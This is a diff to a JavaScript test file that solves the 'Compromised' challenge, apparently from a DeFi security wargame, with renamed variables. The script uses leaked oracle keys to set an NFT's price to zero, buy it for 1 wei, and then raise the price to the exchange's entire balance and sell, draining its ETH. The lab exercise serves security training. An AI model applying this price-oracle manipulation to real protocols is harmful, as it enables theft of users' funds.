@@ -89,49 +89,49 @@ describe("Compromised challenge", function () {
     const trustedOracle2 = new ethers.Wallet(privateKey2, ethers.provider);
 
     // Get the symbol of the NFT to be changed
-    const tokenSymbol = await this.nftToken.symbol();
+    const tokenSymbol = await nftToken.symbol();
 
     // Change its price to zero
     console.log(
       "NFT price before attack: ",
-      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+      String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
     );
-    await this.oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0);
-    await this.oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0);
+    await oracle.connect(trustedOracle1).postPrice(tokenSymbol, 0);
+    await oracle.connect(trustedOracle2).postPrice(tokenSymbol, 0);
 
     // Buy the NFT paying 1 wei
     console.log(
       "NFT price when buying: ",
-      String(await this.oracle.getMedianPrice(tokenSymbol))
+      String(await oracle.getMedianPrice(tokenSymbol))
     );
-    await this.exchange.connect(attacker).buyOne({ value: 1 });
+    await exchange.connect(player).buyOne({ value: 1 });
 
     // Change price of the owned NFT to the balance amount in the Exchange contract
-    await this.oracle
+    await oracle
       .connect(trustedOracle1)
       .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);
-    await this.oracle
+    await oracle
       .connect(trustedOracle2)
       .postPrice(tokenSymbol, EXCHANGE_INITIAL_ETH_BALANCE);
 
     // Approve NFT to the exchange and sell it for all  its ETH
     console.log(
       "NFT price when selling: ",
-      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+      String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
     );
-    await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
-    await this.exchange.connect(attacker).sellOne(0);
+    await nftToken.connect(player).approve(exchange.address, 0);
+    await exchange.connect(player).sellOne(0);
 
     // Change price back to its original value
-    await this.oracle
+    await oracle
       .connect(trustedOracle1)
       .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
-    await this.oracle
+    await oracle
       .connect(trustedOracle2)
       .postPrice(tokenSymbol, INITIAL_NFT_PRICE);
     console.log(
       "NFT price after attack: ",
-      String(await this.oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
+      String(await oracle.getMedianPrice(tokenSymbol)).slice(0, -18)
     );
   });
 
